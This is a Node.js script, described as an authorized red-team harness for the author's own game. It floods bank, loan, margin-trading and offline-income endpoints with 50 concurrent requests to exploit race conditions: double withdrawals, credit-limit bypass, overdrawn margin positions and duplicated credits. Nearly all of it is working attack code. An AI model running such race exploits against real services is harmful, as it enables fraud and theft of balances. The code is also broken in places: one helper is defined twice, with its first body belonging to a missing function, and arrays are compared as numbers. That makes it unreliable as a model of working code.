// RACE-CONDITION TEST HARNESS (authorized red-team, user's own game)
// Usage:
//   node tests/race-test.mjs withdraw <BASE_URL> <TOKEN>
//   node tests/race-test.mjs offline  <BASE_URL> <TOKEN>
//   node tests/race-test.mjs margin   <BASE_URL> <TOKEN>
//   node tests/race-test.mjs borrow   <BASE_URL> <TOKEN>
//
// Findings: a test is a POSITIVE (race confirmed / two-accepted) if the
// invariant breaks — e.g. savings goes negative, cash delta exceeds the
// single-credit amount, or cash becomes negative after margin opens.
// Requires a wallet with enough balance for the chosen test. Read-only
// until the moment it fires the race; money is generated ONLY by the bug.

const [,, testName, BASE_URL, TOKEN] = process.argv;
if (!testName || !BASE_URL || !TOKEN) {
  console.error('Usage: node tests/race-test.mjs <withdraw|offline|margin|borrow> <BASE_URL> <TOKEN>');
  process.exit(1);
}

const AUTH = { Authorization: `Bearer ${TOKEN}` };
const N = 50; // concurrent requests per burst

async function api(path, method = 'GET', body) {
  const res = await fetch(`${BASE_URL}${path}`, {
    method,
    headers: body ? { ...AUTH, 'Content-Type': 'application/json' } : AUTH,
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch {}
  return { status: res.status, json, text };
}

async function getWallet() {
  const r = await api('/api/bank/info');
  return r.json ?? (await api('/api/me')).json;
}

async function fireConcurrent(fn, n) {
  const ok = results.filter(r => r.status === 200 && !r.json?.error);
  const err = results.filter(r => r.status !== 200 || r.json?.error);
  console.log(`[${label}] total=${results.length} accepted=${ok.length} rejected=${err.length}`);
  return ok;
}

async function testWithdraw() {
  const before = await getWallet();
  const amount = Math.floor((before.savings || 0) / 2);
  console.log('before:', before, `amount per attempt = ${amount}`);
  if (amount < 1) return console.log('SKIP: no savings');
  const results = await fireConcurrent(() => api('/api/bank/withdraw', 'POST', { amount }), N);
  const accepted = summarize(results, 'withdraw');
  const after = await getWallet();
  console.log('after:', after);
  const cashDelta = after.cash - before.cash;
  const expected = before.savings - amount; // savings left after ONE accepted
  console.log(`cash delta=${cashDelta}  expected for single-accept=${amount}`);
  if (accepted >= 2 || after.savings < 0 || cashDelta > amount) {
    console.log('>>> EXPLOITED: two-accepted (double refund) — mint confirmed');
    process.exitCode = 1;
  } else {
    console.log('>>> LOOKS SAFE this run (may need more attempts / larger burst)');
  }
}

async function testOffline() {
  // Offline credit is only paid if last_active is >2 min old. Warm phase:
  await api('/api/me');            // set last_active = now
  const before = await getWallet();
  console.log('cash before:', before.cash);
  // wait 130s so minutesAway > 2, then burst
  console.log('waiting 130s so last_active is stale...');
  await new Promise(r => setTimeout(r, 130000));
  const results = await fireConcurrent(() => api('/api/me'), N);
  const accepted = summarize(results, '/api/me');
  const after = await getWallet();
  const delta = after.cash - before.cash;
  console.log(`cash after: ${after.cash}  delta=${delta}`);
  // delta is compared against income rate (unknown); flag if it > 0 and
  // multiple accepts happened — that's multiple credits of the same interval.
  if (accepted > 1 && delta > 0) {
    console.log('>>> SUSPECT: multiple accepted with positive delta = double offline credit');
    process.exitCode = 1;
  }
}

async function testMargin() {
  // Open margin long positions at 3x using half cash; if 2+ accepted the
  // margin debit is blind and cash goes negative (money printer via loan).
  const before = await getWallet();
  const companyId = 1;
  const price = (await api(`/api/stock/quote?companyId=${companyId}`)).json?.price;
  if (!price) return console.log('SKIP: cannot read quote');
  const marginPer = Math.floor(before.cash / 5 / 3); // 1/5 cash per attempt, 3x leverage
  const quantity = Math.max(1, Math.floor((marginPer * 3) / price));
  if (quantity < 1) return console.log('SKIP: cash too low');
  console.log(`opening ${N} concurrent longs ${quantity} @ ${price} (3x)`);
  const results = await fireConcurrent(() =>
    api('/api/stock/margin/open', 'POST', { companyId, quantity, leverage: 3, type: 'long' }), N);
  const accepted = summarize(results, 'margin/open');
  const after = await getWallet();
  console.log(`cash before=${before.cash} after=${after.cash}`);
  if (accepted >= 2 && after.cash < 0) {
    console.log('>>> EXPLOITED: overdraw + double leverage position (minted exposure)');
    process.exitCode = 1;
  }
}

async function testBorrow() {
  const before = (await api('/api/me')).json; // has total_earned
  const max = Math.floor((before?.total_earned || 0) * 0.5);
  if (max < 1) return console.log('SKIP: no credit');
  const amount = Math.floor(max / 2);
  const beforeLoans = (await api('/api/bank/info')).json?.totalDebt ?? 0;
  const results = await fireConcurrent(() => api('/api/bank/borrow', 'POST', { amount }), N);
  const accepted = summarize(results, 'borrow');
  const after = await getWallet();
  const loans = (await api('/api/bank/info')).json?.totalDebt ?? 0;
  console.log(`borrowed ${accepted} times x ${amount} → loan total ${loans} (limit ${max}), cash ${after.cash}`);
  if (accepted + (beforeLoans / amount) > 2 || loans > max + beforeLoans) {
    console.log('>>> EXPLOITED: credit-limit bypass (debt > 50% of total_earned)');
    process.exitCode = 1;
  }
}

async function fireConcurrent(fn, n) {
  const results = [];
  await Promise.all(Array.from({ length: n }, async () => {
    try { results.push(await fn()); } catch (e) { results.push({ status: 0, json: null }); }
  }));
  return results;
}

const runners = { withdraw: testWithdraw, offline: testOffline, margin: testMargin, borrow: testBorrow };
const fn = runners[testName];
if (!fn) { console.error('unknown test: ' + testName); process.exit(1); }
fn().catch(e => { console.error(e); process.exit(2); });